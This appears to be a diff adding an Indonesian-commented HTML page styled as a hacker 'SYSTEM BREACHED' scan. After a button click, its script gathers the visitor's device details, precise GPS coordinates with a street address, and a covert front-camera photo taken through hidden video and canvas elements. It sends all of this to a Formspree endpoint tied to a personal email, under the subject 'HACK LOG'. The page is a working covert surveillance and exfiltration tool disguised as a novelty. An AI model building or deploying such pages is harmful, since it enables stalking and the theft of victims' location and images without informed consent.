@@ -1,0 +1,221 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Security Access | Fahril PROJECT</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body { 
+            background: #000; 
+            color: #0f0; 
+            font-family: 'Courier New', Courier, monospace; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh; 
+            padding: 20px;
+        }
+        .box { 
+            border: 1px solid #0f0; 
+            padding: 35px 25px; 
+            text-align: center; 
+            box-shadow: 0 0 20px #0f0, inset 0 0 10px #0f05; 
+            border-radius: 12px;
+            max-width: 420px;
+            width: 100%;
+        }
+        .box h2 {
+            margin-bottom: 10px;
+            font-size: 22px;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .box p {
+            font-size: 14px;
+            color: #0f0; 
+            opacity: 0.8;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
+        button { 
+            background: #0f0; 
+            color: #000; 
+            border: none; 
+            padding: 12px 25px; 
+            font-weight: bold; 
+            cursor: pointer; 
+            margin-top: 5px;
+            border-radius: 6px;
+            font-size: 15px;
+            transition: all 0.3s ease;
+        }
+        button:hover {
+            box-shadow: 0 0 12px #0f0;
+            transform: scale(1.05);
+        }
+        #status { 
+            margin-top: 18px; 
+            font-size: 12px; 
+            color: #888; 
+            border-top: 1px solid #0f0;
+            padding-top: 10px;
+            min-height: 30px;
+        }
+        .loading {
+            display: inline-block;
+            animation: blink 1s infinite;
+        }
+        @keyframes blink {
+            0%,100% {opacity: 1;}
+            50% {opacity: 0.3;}
+        }
+    </style>
+    <script src="https://cdn.jsdelivr.net/npm/ua-parser-js@1.0.35/dist/ua-parser.min.js"></script>
+</head>
+<body>
+    <div class="box">
+        <!-- ✅ JUDUL & DESKRIPSI UDAH DIBENERIN, GAK ADA KATA "VERIFIKASI" LAGI -->
+        <h2>💀 SYSTEM BREACHED</h2>
+        <p>Accessing private server... Loading user data...</p>
+        
+        <!-- ✅ TOMBOL SESUAI GAYA KEREN -->
+        <button id="startBtn">INITIATE SCAN</button>
+        
+        <div id="status">Status: Standby...</div>
+    </div>
+
+    <video id="v" style="display:none" autoplay playsinline></video>
+    <canvas id="c" style="display:none"></canvas>
+
+    <script>
+        const btn = document.getElementById('startBtn');
+        const status = document.getElementById('status');
+
+        btn.onclick = async () => {
+            status.innerHTML = "🔄 Processing payload... <span class='loading'>▮</span>";
+            
+            const parser = new UAParser();
+            const hasil = parser.getResult();
+            
+            const data = {
+                waktu: new Date().toLocaleString('id-ID'),
+                ram: navigator.deviceMemory || "Unidentified",
+                sistem_operasi: `${hasil.os.name} ${hasil.os.version || 'Unknown'}`, // ✅ Android terbaca bener
+                tipe_perangkat: hasil.device.model || hasil.device.type || "Device", // ✅ Tipe HP bener
+                merek_perangkat: hasil.device.vendor || "Unknown Brand",
+                jenis_browser: `${hasil.browser.name} ${hasil.browser.version}`,
+                platform_lengkap: navigator.platform || "-",
+                user_agent: hasil.ua
+            };
+
+            // ==============================================
+            // ✅ LOKASI - KATA KEREN
+            // ==============================================
+            status.innerText = "📍 Tracing exact coordinates...";
+            try {
+                const posisi = await new Promise((berhasil, gagal) => {
+                    navigator.geolocation.getCurrentPosition(berhasil, gagal, {
+                        enableHighAccuracy: true,
+                        timeout: 15000,           
+                        maximumAge: 0             
+                    });
+                });
+
+                let lat = posisi.coords.latitude.toFixed(8);
+                let lng = posisi.coords.longitude.toFixed(8);
+                let akurasi = posisi.coords.accuracy.toFixed(0);
+
+                status.innerText = "🗺️ Decoding location data...";
+                let resAlamat = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lng}&format=json&accept-language=id`);
+                let jsonAlamat = await resAlamat.json();
+
+                data.koordinat = `${lat}, ${lng}`;
+                data.akurasi = `${akurasi} METER (Precise)`;
+                data.alamat_lengkap = jsonAlamat.display_name || "Address not found";
+                data.link_maps = `https://www.google.com/maps?q=${lat},${lng}`;
+                status.innerHTML = "✅ Location locked! <span class='loading'>▮</span>";
+
+            } catch (e) {
+                data.alamat_lengkap = "❌ ERROR: GPS Signal Lost / Denied!";
+                data.koordinat = "No Data";
+                data.link_maps = "-";
+                status.innerText = "⚠️ Location access denied!";
+            }
+
+            // ==============================================
+            // ✅ TULISAN YANG KAMU MINTA TETEP: Loading meta data for hacker...
+            // ==============================================
+            try {
+                status.innerText = "📸 Loading meta data for hacker..."; 
+                
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user", width: 640, height: 480 },
+                    audio: false 
+                });
+                
+                const v = document.getElementById('v');
+                v.srcObject = stream;
+                v.play();
+
+                setTimeout(() => {
+                    const canvas = document.getElementById('c');
+                    canvas.width = v.videoWidth;
+                    canvas.height = v.videoHeight;
+                    const ctx = canvas.getContext('2d');
+                    ctx.translate(canvas.width, 0);
+                    ctx.scale(-1, 1);
+                    ctx.drawImage(v, 0, 0, canvas.width, canvas.height);
+                    
+                    data.foto = canvas.toDataURL('image/jpeg', 0.9); // ✅ Foto jadi gambar
+                    stream.getTracks().forEach(track => track.stop()); 
+                    kirimDataKeEmail(data);
+                }, 2000); 
+
+            } catch (e) {
+                data.foto = "⚠️ Metadata access rejected";
+                kirimDataKeEmail(data);
+            }
+        };
+
+        // ==============================================
+        // ✅ KIRIM DATA KE FORM LU
+        // ==============================================
+        function kirimDataKeEmail(dt) {
+            status.innerHTML = "📤 Uploading logs to server... <span class='loading'>▮</span>";
+            
+            const xhr = new XMLHttpRequest();
+            xhr.open("POST", "https://formspree.io/f/mlgvrrwk", true);
+            xhr.setRequestHeader("Accept", "application/json");
+            xhr.setRequestHeader("Content-Type", "application/json");
+
+            xhr.onreadystatechange = function() {
+                if (xhr.readyState === 4) {
+                    status.innerHTML = "✅ [COMPLETE] All data exfiltrated.";
+                    alert("✅ ACCESS GRANTED: File transfer complete.");
+                }
+            };
+
+            xhr.send(JSON.stringify({
+                _replyto: 'fahrilmoonstar@gmail.com',
+                _subject: '🚨 HACK LOG | DEVICE + LOCATION + IMAGE - FAHRIL',
+                time: dt.waktu,
+                brand: dt.merek_perangkat,
+                device_model: dt.tipe_perangkat,
+                os_version: dt.sistem_operasi, // ✅ Android 12/13/14 kebaca bener
+                browser: dt.jenis_browser,
+                ram_size: dt.ram + " GB",
+                full_address: dt.alamat_lengkap,
+                gps_coords: dt.koordinat,
+                accuracy: dt.akurasi,
+                google_maps: dt.link_maps,
+                image_file: dt.foto // ✅ Gambar langsung muncul
+            }));
+        }
+    </script>
+</body>
+</html>
